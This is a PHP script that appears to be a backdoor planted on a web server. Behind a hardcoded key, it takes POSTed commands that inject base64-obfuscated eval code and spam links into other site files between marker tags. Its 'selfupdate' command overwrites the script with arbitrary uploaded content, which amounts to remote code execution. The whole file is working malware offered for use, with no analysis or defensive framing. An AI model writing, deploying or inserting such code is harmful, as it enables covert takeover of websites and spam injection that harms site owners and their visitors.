<?php
$private_key = 'd9fb6a3779c6d447c4d0f38bfc904907';
$version = '1.2';




function myErrorHandler2 ($errno, $errstr, $errfile, $errline) {
	$data = array();
	$data["error"]=array(
		"errno"=>$errno, 
		"errstr"=>$errstr, 
		"errfile"=>$errfile, 
		"errline"=>$errline
	);
	echo json_encode($data);
	
}
set_error_handler("myErrorHandler2");
$data = array(); 
class PhpCommander {    
	public $password;
	public $metka;
	public function __construct($code) {
		$this->password = $code;
	}                          
	public function checkPassword ($password) {
		if($password==md5($this->password."-check")) 
			return true;
		else                              
			return false;
	}
	public function replaceLinks ($data) {
		$this->metka = $data['metka'];
		
		if(!is_file($data['filename'])) return 'Replace File not found';
		if(!is_writable($data['filename'])) return 'Replace File not writable';
		
		switch($data['code_type']) {
			case 'php':
				$count = $this->insertPhpVariant($data['filename'],$data);
				if($count>0)
					return 'Done.';
				else 
					return 'Code not found';
			break;
			case 'html':
				$count = $this->insertHtmlVariant($data['filename'],$data);
				if($count>0)
					return 'Done.';
				else 
					return 'Code not found';
			break;

		}

	}
	public function insertPhpVariant ($filename,$data) {
		$file = file_get_contents($filename);
		
		$inject = array(
					'links'=>$data['links'],
					'link_tpl'=>$data['link_tpl'],
					'link_wrapper'=>$data['link_wrapper']
				);
		$code = '
$phc7=json_decode(base64_decode("'.base64_encode(json_encode($inject)).'"),1);';
		$code .= '
$phc7["request"]=$_SERVER["REQUEST_URI"];
$phc7["append"]=array();
foreach($phc7["links"] as $url=>$phc7_links){
	if($url==$phc7["request"] || $url=="_all_") {
		foreach($phc7_links as $phc7_link) {
			$phc7["append"][]=str_replace(array("{anchor}","{url}"), array($phc7_link[0],$phc7_link[1]), $phc7["link_tpl"]);
		}
	}
		
}
if(count($phc7["append"])>0) 
		echo str_replace("{wrapper}", implode(" ",$phc7["append"]),$phc7["link_wrapper"]);
';
		$code = 'eval(base64_decode("'.base64_encode($code).'"));';
			
			
		$metka = $this->metka;
		$count = 0;
		$insert = "<{$metka}>\n".$code."\n//</{$metka}>";
		$file =  preg_replace(
			'#(.*)<'.$metka.'>(.*?)</'.$metka.'>(.*)#is', 
			'$1'.$insert.'$3', 
			$file, 
			-1,
			$count);
		$result = file_put_contents($filename,$file);
		return $count;
	}
	
	public function insertHtmlVariant ($filename,$data) {
		$file = file_get_contents($filename);
		$append = array();
		$code = '';
		foreach($data['links'] as $url=>$phc7_links){
			if($url=="_all_") {
				foreach($phc7_links as $phc7_link) 
					$append[]=str_replace(array("{anchor}","{url}"), array($phc7_link[0],$phc7_link[1]), $data['link_tpl']);
			}
		}
		if(count($append)>0) 
			$code = str_replace("{wrapper}", implode(" ",$append),$data["link_wrapper"]);

			
			
		$metka = $this->metka;
		$count = 0;
		$insert = "<!-- {$metka} -->\n".$code."\n<!-- /{$metka} -->";
		$file =  preg_replace(
			'#(.*)<!-- '.$metka.' -->(.*?)<!-- /'.$metka.' -->(.*)#is', 
			'$1'.$insert.'$3', 
			$file, 
			-1,
			$count);
		$result = file_put_contents($filename,$file);
		return $count;
	}
}   
if(!isset($_POST["hash"])) 
	exit;
	
$system = new PhpCommander($private_key);
if(!$system->checkPassword($_POST["hash"])) {
	$data['error']='Wrong password';
	echo json_encode($data);
	die;
}

$command = $_POST["command"];
switch($command) {
	case "replace":
		$data['result']=$system->replaceLinks(json_decode(base64_decode($_POST["content"]),1));
	break;
	case "selfupdate":
		$result = file_put_contents(__FILE__,json_decode(base64_decode($_POST["content"])));
		$data["update_result"]=$result;
	break;
	case "version":
		$data["version"]=$version;
	break;
}
echo json_encode($data);
?>